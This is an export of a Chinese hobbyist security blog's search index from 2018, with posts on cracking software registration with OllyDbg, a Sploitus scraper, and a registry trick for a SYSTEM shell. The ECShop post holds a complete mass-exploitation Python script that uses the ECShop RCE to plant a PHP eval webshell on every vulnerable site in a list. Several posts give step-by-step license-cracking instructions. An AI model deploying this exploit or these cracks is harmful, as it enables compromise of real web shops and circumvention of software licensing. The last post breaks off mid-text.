<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>针对VB的破解</title>
      <link href="/2018/09/15/%E9%92%88%E5%AF%B9VB%E7%9A%84%E7%A0%B4%E8%A7%A3/"/>
      <url>/2018/09/15/%E9%92%88%E5%AF%B9VB%E7%9A%84%E7%A0%B4%E8%A7%A3/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shark恒的教程去到第一期的第十一课，针对vb的窗口破解。因为vb没有任何办法搜索关键字进行断点<br>另外还学到了如何识别PE是vb。<br><a href="http://img0.imgtn.bdimg.com/it/u=2358224950,2183871480&amp;fm=26&amp;gp=0.jpg" target="_blank" rel="noopener"></a><img src="https://s1.ax1x.com/2018/09/15/iVCE4I.jpg" alt="iVCE4I.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>第十一课的课件是，系统加速的exe。首先还是常规操作，将PE拖入到PEID查壳<br><img src="https://s1.ax1x.com/2018/09/15/iVCwb4.png" alt="iVCwb4.png"><br>无壳，将其载入OD<br><img src="https://s1.ax1x.com/2018/09/15/iVCc26.md.png" alt="iVCc26.md.png"><br>发现满足VB程序的条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有一个push,jmp &amp;MSVBxxx,往上拉还能发现vb的函数</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/09/15/iVCWrD.png" alt="iVCWrD.png"><br>通过弹窗来寻找关键跳，F9运行程序，输入假码，点击VB选择BP rtcMsgBox窗口弹出函数<br><img src="https://s1.ax1x.com/2018/09/15/iVCIIA.md.png" alt="iVCIIA.md.png"><br>点击注册发现被断了下来，(来到了系统领空)<br><img src="https://s1.ax1x.com/2018/09/15/iVCTPI.md.png" alt="iVCTPI.md.png"><br>Alt+F9跳出系统领空去到程序领空。<br><img src="https://s1.ax1x.com/2018/09/15/iVCbxf.md.png" alt="iVCbxf.md.png"><br>发现我们刚刚从一个call走了出来<br><img src="https://s1.ax1x.com/2018/09/15/iVCLM8.md.png" alt="iVCLM8.md.png"><br>往上面观察发现了一个jmp跳转，跳过了错误，上去看看<br><img src="https://s1.ax1x.com/2018/09/15/iVCOsS.png" alt="iVCOsS.png"><br>发现jmp被跳过了，发现一个跳到lea的标志。点击跟随跳转<br><img src="https://s1.ax1x.com/2018/09/15/iVPALF.md.png" alt="iVPALF.md.png"><br>发现关键跳，将其下断点尝试<br><img src="https://s1.ax1x.com/2018/09/15/iVPeo9.md.png" alt="iVPeo9.md.png"><br>重启程序，点击注册，发现成功断了下来<br><img src="https://s1.ax1x.com/2018/09/15/iVPJdH.md.png" alt="iVPJdH.md.png"><br>进行NOP填充即可<br><img src="https://s1.ax1x.com/2018/09/15/iVPUJI.md.png" alt="iVPUJI.md.png"><br>重新运行程序，发现已经破解<br><img src="https://s1.ax1x.com/2018/09/15/iVPaWt.png" alt="iVPaWt.png"></p><p><img src="https://s1.ax1x.com/2018/09/15/iVPseg.png" alt="iVPseg.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">遇见VB写的PE我们可以使用，今天这种断点弹窗的方法</span><br><span class="line">进行断点，然后寻找关键跳</span><br></pre></td></tr></table></figure><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取sploitus的记录</title>
      <link href="/2018/09/14/%E6%8A%93%E5%8F%96sploitus%E7%9A%84%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/09/14/%E6%8A%93%E5%8F%96sploitus%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上学的第二个星期回到家，在这个星期翻到一个不错的搜索引擎。果断将其爬下来<br><a href="https://sploitus.com/" target="_blank" rel="noopener">💀 Sploitus | Exploit &amp; Hacktool Search Engine</a><br><img src="https://s1.ax1x.com/2018/09/14/iEhkDg.png" alt="iEhkDg.png"><br>Music：<embed src="//music.163.com/style/swf/widget.swf?sid=5240550&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先请求URL然后抓包<br><img src="https://s1.ax1x.com/2018/09/14/iEhe5n.md.png" alt="iEhe5n.md.png"><br>逐个观察，发现search返回了搜索的内容那么就看他了<br><img src="https://s1.ax1x.com/2018/09/14/iEhnCq.md.png" alt="iEhnCq.md.png"><br>返回是json<br><img src="attachments\96137825.png" alt="96137825.png"></p><p>爬虫思路：<br><code>发现有accept: application/json请求头，那么就很简单了带上user-agent头和accept头和对应的请求参数post请求格式化json即可</code><br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">banner=&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">   .dMMMb  dMMMMb  dMP    .aMMMb  dMP dMMMMMMP dMP dMP .dMMMb </span><br><span class="line">  dMP&quot; VP dMP.dMP dMP    dMP&quot;dMP amr    dMP   dMP dMP dMP&quot; VP </span><br><span class="line">  VMMMb  dMMMMP&quot; dMP    dMP dMP dMP    dMP   dMP dMP  VMMMb   </span><br><span class="line">dP .dMP dMP     dMP    dMP.aMP dMP    dMP   dMP.aMP dP .dMP   </span><br><span class="line">VMMMP&quot; dMP     dMMMMMP VMMMP&quot; dMP    dMP    VMMMP&quot;  VMMMP&quot; </span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">print(banner)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line">print(&apos;author:Nine world&apos;)</span><br><span class="line">print(&apos;--------------------------------------------------------------------------------------&apos;)</span><br><span class="line">def sploitus():</span><br><span class="line">    #headers=&#123;&apos;user-agent&apos;:&apos;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;,&apos;content-type&apos;: &apos;application/json&apos;,&apos;accept&apos;: &apos;application/json&apos;,&apos;referer&apos;: &apos;https://sploitus.com/?query=MS17-010&apos;&#125;</span><br><span class="line">    print(&apos;[!] Please select type&apos;)</span><br><span class="line">    print(&apos;exploits&apos;)</span><br><span class="line">    print(&apos;tools&apos;)</span><br><span class="line">    xz=input(&apos;type:&apos;)</span><br><span class="line">    user=input(&apos;query:&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    headers=&#123;</span><br><span class="line">    &apos;accept&apos;: &apos;application/json&apos;,</span><br><span class="line">    &apos;user-agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    url=&apos;https://sploitus.com/search&apos;</span><br><span class="line">    data=&#123;&apos;offset&apos;:0,&apos;query&apos;:&quot;&#123;&#125;&quot;.format(user),&apos;sort&apos;:&quot;default&quot;,&apos;title&apos;:&apos;false&apos;,&apos;type&apos;:&quot;&#123;&#125;&quot;.format(xz)&#125;</span><br><span class="line">    cookie=&#123;&apos;__cfduid&apos;:&apos;d7ecd3f6052b48a13d4a47e83dbdd15eb1536914053&apos;&#125;</span><br><span class="line">    requt=requests.post(url=url,headers=headers,json=data,cookies=cookie)</span><br><span class="line">    jds=requt.json()</span><br><span class="line">    lp=jds[&apos;exploits&apos;][0:]</span><br><span class="line">    for l in lp:</span><br><span class="line">        print(&apos;title:&apos;,l[&apos;title&apos;])</span><br><span class="line">        #print(&apos;published&apos;,l[&apos;published&apos;])</span><br><span class="line">        print(&apos;id&apos;,l[&apos;id&apos;])</span><br><span class="line">        print(&apos;type:&apos;,l[&apos;type&apos;])</span><br><span class="line">        print(&apos;url:&apos;,l[&apos;href&apos;])</span><br><span class="line">        print(&apos;&apos;)</span><br><span class="line">sploitus()</span><br></pre></td></tr></table></figure></p><p>测试截图：<br><img src="https://s1.ax1x.com/2018/09/14/iEhY5R.png" alt="iEhY5R.png"></p><p><img src="https://s1.ax1x.com/2018/09/14/iEhU8x.png" alt="iEhU8x.png"></p><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>万能断点了解一下</title>
      <link href="/2018/09/08/%E4%B8%87%E8%83%BD%E6%96%AD%E7%82%B9%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B/"/>
      <url>/2018/09/08/%E4%B8%87%E8%83%BD%E6%96%AD%E7%82%B9%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>放假了，继续学破解。shark恒第10课，万能断点。主要用在PE头别修改的问题上。<br>下面开始说正事了哈<br><img src="https://s1.ax1x.com/2018/09/08/iPfbi8.jpg" alt="iPfbi8.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>第10课的课件是MP3转换器，首先拿去查壳（常规操作）<br><img src="https://s1.ax1x.com/2018/09/08/iPhSZq.png" alt="iPhSZq.png"><br>载入OD(在OD可以更加直观的看到PE头被修改了)<br><img src="https://s1.ax1x.com/2018/09/08/iPhPiT.png" alt="iPhPiT.png"><br>然后F9运行程序<br><img src="https://s1.ax1x.com/2018/09/08/iPhlWD.png" alt="iPhlWD.png"><br>回到反汇编窗口，右键单击查看-&gt;user32模块<br><img src="https://s1.ax1x.com/2018/09/08/iPhGyd.png" alt="iPhGyd.png"><br>然后在user32模块里右键-&gt;查找-&gt;二进制字符串，搜索F3 A5 8B C8 83 E1 03 F3 A4 E8(万能断点处)<br><img src="https://s1.ax1x.com/2018/09/08/iPhUTP.png" alt="iPhUTP.png"><br>然后点击确定就会跳到反汇编窗口(注意：系统领空)<br><img src="https://s1.ax1x.com/2018/09/08/iPhwY8.md.png" alt="iPhwY8.md.png"><br>打开PE输入好假码之后进行，断点操作<br><img src="https://s1.ax1x.com/2018/09/08/iPhyOs.png" alt="iPhyOs.png"><br>点击确认后，发现程序断了下来<br><img src="https://s1.ax1x.com/2018/09/08/iPhgwq.png" alt="iPhgwq.png"><br>Alt+F9跳出系统领空<br><img src="https://s1.ax1x.com/2018/09/08/iPhfYT.png" alt="iPhfYT.png"><br>然后F8单步就能见到假码，真码，真码与假码对比<br>(真码)<br><img src="https://s1.ax1x.com/2018/09/08/iPhXtK.png" alt="iPhXtK.png"><br>(真假码对比)<br><img src="https://s1.ax1x.com/2018/09/08/iP4S6H.md.png" alt="iP4S6H.md.png"><br>(将真码拷贝出来，关闭OD)注册即可<br><img src="https://s1.ax1x.com/2018/09/08/iP4pXd.md.png" alt="iP4pXd.md.png"></p><p>这些天破解的总结<br><code></code></p><html><br><head><br>  <title>Evernote Export</title><br>  <basefont face="微软雅黑" size="2"><br>  <meta http-equiv="Content-Type" content="text/html;charset=utf-8"><br>  <meta name="exporter-version" content="YXBJ Windows/600240 (zh-CN, DDL); Windows/6.1.1 (Win64);"><br>  <style><br>    body, td {<br>      font-family: 微软雅黑;<br>      font-size: 10pt;<br>    }<br>  </style><br></head><br><body><br><a name="1938"><br><br><div><span><div>逆向第二课总结<br>破解要用反向思维来想。比如他跳转不成功进入到报错。那他跳转成功是否是正确的呢？<br><br></div><div>注意:当修改CPU区的代码的时候按空格，修改必须保证修改的代码为16进制</div></span><br></div><br><hr><br><a name="1939"><br><br><div><br><span><div>逆向第一课总结:</div><div><br></div><div>1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。</div><div><br></div><div>2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个</div><div><br></div><div>3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符&gt;</div><div>，然后进行noop填聪(就是什么也没有)，然后软件就破解了。</div><div><br></div><div><br></div><div>自己可以考虑用C写个简单的登陆程序，进行破解。完毕</div><div><br></div><div>注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。</div><div><br></div><div>破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字</div></span><br></div><br><hr><br><a name="1952"><br><br><div><span><div>破解不联网登陆软件</div><div>常规思路就是:查壳，脱壳，然后拖入od，看看他有没有跳过什么，如果是红色线跳转的话noop填充把跳转删了，如果是灰色线跳转不超过的话，把开始跳转的汇编代码改为jmp 无条件跳转，如果有个x前面加个0</div></span><br></div><br><hr><br><a name="1958"><br><br><div><br><span><div><a href="https://422926799.github.io/2018/08/26/ESP%E5%AE%9A%E5%BE%8B/" target="_blank" rel="noopener">https://422926799.github.io/2018/08/26/ESP%E5%AE%9A%E5%BE%8B/</a></div></span><br></div><br><hr><br><a name="1960"><br><br><div><br><span><div>当你脱壳之后，因为现在壳都有压缩功能。所有脱壳之后文件会变大，如果文件变大了。如果PE有检测文件大小功能，如果文件大小不等于</div><div>有壳时候的大小就会退出PE。判断是否有自效验就是，脱壳后PE打不开。</div><div><br></div><div>破解方法：</div><div>将PE拖入到OD设置API断点-&gt;常用断点-&gt;文件大小断点。F9运行，发现程序被断下来了，在右下角的窗口可以看见判断函数，点击反汇编数据窗口跟踪，然后如果发现。cmp 十六进制（文件大小），然后用Noop填充即可</div></span><br></div><br><hr><br><a name="1964"><br><br><div><br><span><div>一般有关键跳上面就有关键call,z载入OD的程序可以观察一下有什么注册成功之类的关键字。上面就有关键跳和关键call，找主要跳转。如果关键跳跳过了正确程序的话，可以从关键call中进行更改使关键call达到正确的程序，关键call和关键跳中有笔记,test可以仔细观察一下</div></span><br></div><br><hr><br><a name="1980"><br><br><div><br><span><div>一般有注册或者登陆之类的。载入OD找好关键字之后，双击跳到反汇编窗口之后。可以发现判断跳转的都是je</div></span><br></div><br><hr><br><a name="1984"><br><br><div><br><span><div>先用API断点函数下一个ReadFile读文件的函数，如果有壳则用401000跳到字符区。然后搜索关键字，双击关键字跳到反汇编窗口F2下断点，将读文件的断点禁止，运行软件跳到断点</div><div>之后往上看判断，是否有真码</div></span><br></div><br><hr><br><a name="1994"><br><br><div><br><span><div>ini类型重启验证(重启验证之后没有任何关键字提示)，我们就用不了ReadFile类型断点任何在搜索关键字来搜索真码，但是我们可以用BP下个GetPrivateProfileStringA断点，专门用于对付ini重启验证。</div><div>知识点记录：</div><div>程序领空：OD左上角文件名如果文件是程序名就是程序领空</div><div>系统领空：OD左上角文件名如果不是程序名的话就是系统领空</div><div>如果遇见系统领空的话就按Alt+F9(或者在调试按执行到用户代码)跳出系统领空，然后单步寻找真码</div><div><br></div><div><br></div></span><br></div><br><hr><br><a name="2033"><br><br><div><br><span><div>因为PE头部被修改，将PE载入到OD之后直接运行程序。右键-&gt;查找-&gt;模块user32。到了模块user32之后进行查找-&gt;二进制字符串-&gt;搜索：<span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;">F3 A5 8B C8 83 E1 03 F3 A4 E8，双击跳转。然后在合适的步骤下断点，等程序断下来之后</span></div><div><span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;">Alt+F9跳出系统领空，找真码即可。</span></div><div><span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;"><br></span></div></span><br></div></a></a></a></a></a></a></a></a></a></a></body></html> ]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>另一种获得系统SHELL的方法 - 辅助技术</title>
      <link href="/2018/09/07/%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%8E%B7%E5%BE%97%E7%B3%BB%E7%BB%9FSHELL%E7%9A%84%E6%96%B9%E6%B3%95-%E8%BE%85%E5%8A%A9%E6%8A%80%E6%9C%AF/"/>
      <url>/2018/09/07/%E5%8F%A6%E4%B8%80%E7%A7%8D%E8%8E%B7%E5%BE%97%E7%B3%BB%E7%BB%9FSHELL%E7%9A%84%E6%96%B9%E6%B3%95-%E8%BE%85%E5%8A%A9%E6%8A%80%E6%9C%AF/</url>
      <content type="html"><![CDATA[<h2 id="这里做一个简单的纪录"><a href="#这里做一个简单的纪录" class="headerlink" title="这里做一个简单的纪录"></a>这里做一个简单的纪录</h2><p>原文是来自：<a href="https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/" target="_blank" rel="noopener">Another way to get to a system shell – Assistive Technology – Oddvar Moe’s Blog</a><br><img src="https://s1.ax1x.com/2018/09/07/iPQBx1.png" alt="iPQBx1.png"></p><p>运行regedit<br><img src="https://s1.ax1x.com/2018/09/07/iPQrKx.png" alt="iPQrKx.png"><br>在注册表里找到<code>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Accessibility \ ATs \ magnifierpane</code><br><img src="https://s1.ax1x.com/2018/09/07/iPQgaD.png" alt="iPQgaD.png"><br>然后给权限这个项目，修改值就好<br>给注册表权限：<a href="http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html" target="_blank" rel="noopener">http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html</a><br>测试结果：<br><img src="https://s1.ax1x.com/2018/09/07/iPQWPH.md.png" alt="iPQWPH.md.png"><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Eschop</title>
      <link href="/2018/09/07/ECShop%20%E5%85%A8%E7%B3%BB%E5%88%97%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9Eexp%E8%84%9A%E6%9C%AC/"/>
      <url>/2018/09/07/ECShop%20%E5%85%A8%E7%B3%BB%E5%88%97%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9Eexp%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm,这个洞都是星期一的事情了。只不过我在上学，无奈的一批没办法写博客和进行复现。现在才补上，sorry啊。</p><p><img src="https://s1.ax1x.com/2018/09/07/iPZGkR.jpg" alt="iPZGkR.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞分析原文：ECShop全系列版本远程代码执行高危漏洞分析<br>ECSHOP RCE 漏洞复现教程：VULNSPY实验-ECShop &lt;= 2.7.x 全系列版本远程代码执行高危漏洞利用<br>漏洞复现地址：<a href="https://www.vsplate.com/?github=vulnspy/ECShop_2.7.3_UTF8_installed&amp;autogo=1" target="_blank" rel="noopener">https://www.vsplate.com/?github=vulnspy/ECShop_2.7.3_UTF8_installed&amp;autogo=1</a></p><p>复现完漏洞之后，你就明白得到了其中的思路：</p><p>此脚本的思路：<br><code>首先先判断是否存在远程漏洞，如果有加入列表与写入save.txt判断加入的列表是否有存在漏洞的url，大于0则用正则匹配出url，一个url进行getshell请求。然后那个匹配出来的url加入getshell之后的一句话后门路径。判断是否存在存在就写入txt否则就不写入....可能说的比较不清楚</code></p><p>代码：<br><figure class="highlight plain"><figcaption><span>requests</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">xj=open(&apos;save.txt&apos;,&apos;w&apos;)</span><br><span class="line">xj.close()</span><br><span class="line"></span><br><span class="line">cz=[]</span><br><span class="line">def exploit(url):</span><br><span class="line">    url=url+&apos;/user.php&apos;</span><br><span class="line">    header=&#123;&apos;Referer&apos;: &apos;554fcae493e564ee0dc75bdf2ebf94caads|a:3:&#123;s:2:&quot;id&quot;;s:3:&quot;&apos;&quot;&apos;&quot;&apos;/*&quot;;s:3:&quot;num&quot;;s:201:&quot;*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--&quot;;s:4:&quot;name&quot;;s:3:&quot;ads&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca&apos;&#125;</span><br><span class="line">    data=&#123;&apos;action&apos;:&apos;login&apos;,&apos;vulnspy&apos;:&apos;phpinfo();exit;&apos;&#125;</span><br><span class="line">    try:</span><br><span class="line">        reqt=requests.post(url=url,headers=header,data=data,timeout=10)</span><br><span class="line">        if &apos;PHP Version&apos; in reqt.text:</span><br><span class="line">            print(&apos;[+] Remote code execution high-risk vulnerabilities url:&#123;&#125;&apos;.format(reqt.url))</span><br><span class="line">            print(&apos;[+] Remote code execution high-risk vulnerabilities url:&#123;&#125;&apos;.format(reqt.url),file=open(&apos;save.txt&apos;,&apos;a&apos;))</span><br><span class="line">            cz.append(reqt.url)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[-] Not debug url:&#123;&#125;&apos;.format(reqt.url))</span><br><span class="line">    except Exception as g:</span><br><span class="line">        print(&apos;[-] Error &#123;&#125;&apos;.format(g))</span><br><span class="line"></span><br><span class="line">    if len(cz)&gt;0:</span><br><span class="line">        print(&apos;[+] start getshell&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] not debug,Unable to getshell&apos;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    getshellpayloads=&#123;&apos;action&apos;:&apos;login&apos;,&apos;vulnspy&apos;:&apos;eval(base64_decode($_POST[d]));exit;&apos;,&apos;d&apos;:&apos;ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOz8+Jyk7&apos;&#125;</span><br><span class="line"></span><br><span class="line">    for t in cz:</span><br><span class="line">        tx=re.sub(&apos;/user.php&apos;,&apos;&apos;,str(t))</span><br><span class="line">        try:</span><br><span class="line">            reqts2=requests.post(url=t,headers=header,data=getshellpayloads)</span><br><span class="line">            reqts3=requests.post(url=tx+&apos;/vulnspy.php?vulnspy=phpinfo();&apos;)</span><br><span class="line">            if &apos;PHP Version&apos; in reqts3.text:</span><br><span class="line">                print(&apos;[+] Getshell success url:&#123;&#125; password:&#123;&#125;&apos;.format(reqts3.url, &apos;vulnspy&apos;))</span><br><span class="line">                print(&apos;[+] Getshell success url:&#123;&#125; password:&#123;&#125;&apos;.format(reqts3.url,&apos;vulnspy&apos;),file=open(&apos;save.txt&apos;,&apos;a&apos;))</span><br><span class="line">            else:</span><br><span class="line">                print(&apos;[-] Getshell failure url:&#123;&#125;&apos;.format(reqts3.url))</span><br><span class="line">        except Exception as p:</span><br><span class="line">            print(&apos;[-] Error &#123;&#125;&apos;.format(p))</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    user = input(&apos;file:&apos;)</span><br><span class="line">    if os.path.exists(user):</span><br><span class="line">        print(&apos;[+] file &#123;&#125; ok&apos;.format(user))</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] not file &#123;&#125;&apos;.format(user))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    dk=open(&apos;&#123;&#125;&apos;.format(user),&apos;r&apos;)</span><br><span class="line">    for d in dk.readlines():</span><br><span class="line">        qc=&quot;&quot;.join(d.split(&apos;\n&apos;))</span><br><span class="line">        t=threading.Thread(target=exploit,args=(qc.rstrip(&apos;/&apos;),))</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure></p><p>测试结果：<br><img src="https://s1.ax1x.com/2018/09/07/iPe941.png" alt="iPe941.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/09/07/iPepNR.png" alt="iPepNR.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/09/07/iPeMCt.md.png" alt="iPeMCt.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解QQ传情</title>
      <link href="/2018/09/01/%E7%A0%B4%E8%A7%A3QQ%E4%BC%A0%E6%83%85/"/>
      <url>/2018/09/01/%E7%A0%B4%E8%A7%A3QQ%E4%BC%A0%E6%83%85/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天暑假最后一天，我特么的不想上学。回到学校见到特么63个男的加见到丑的一批的班主任，就忍不住把那些老师全部打死，天天拿毕业证说事。<br><img src="https://s1.ax1x.com/2018/09/01/PxF9mT.jpg" alt="PxF9mT.jpg"> <img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=3988330260,3412584568&amp;fm=26&amp;gp=0.jpg" alt="u=3988330260,3412584568&amp;fm=26&amp;gp=0.jpg"></p><p><code>猫女被打爆了头...</code></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>恒大的课程看到了第九课，第八课的课件失踪了。到时候补上，我们拿到的课件的软件名叫做<br>QQ传情= =，这名字。。不管了，先来看看软件<br>首先打开软件，发现他让你注册，注册码瞎几把乱填。<br><img src="https://s1.ax1x.com/2018/09/01/PxF3hd.md.png" alt="PxF3hd.md.png"><br>然后点击注册软件，让你重启验证。<br><img src="https://s1.ax1x.com/2018/09/01/PxFG9A.png" alt="PxFG9A.png"><br>注册码当然是错误的，我们可以发现文件夹里有几个ini配置文件，值得关注的是Config.ini我们按进去看看打开软件也是没用注册。这里也没用像星空网游的那个软件一样重启验证后有提示，也就是说我们这里没用关键字！那我们该怎么办？先关闭软件吧。<br><img src="https://s1.ax1x.com/2018/09/01/PxFtjP.md.png" alt="PxFtjP.md.png"><br>然后查壳<br><img src="https://s1.ax1x.com/2018/09/01/PxFe6x.md.png" alt="PxFe6x.md.png"><br>无壳，然后载入OD<br><img src="https://s1.ax1x.com/2018/09/01/PxFK0O.png" alt="PxFK0O.png"><br>按照课程思路，按BP下一个<code>GetPrivateProfileStringA断点</code><br>(这个断点专门用来搞ini重启验证的)<br>然后F9运行程序，发现程序断在了断点上<br><img src="https://s1.ax1x.com/2018/09/01/PxFcj0.md.png" alt="PxFcj0.md.png"><br>然后我们发现我们从<code>程序领空进入到了系统领空</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 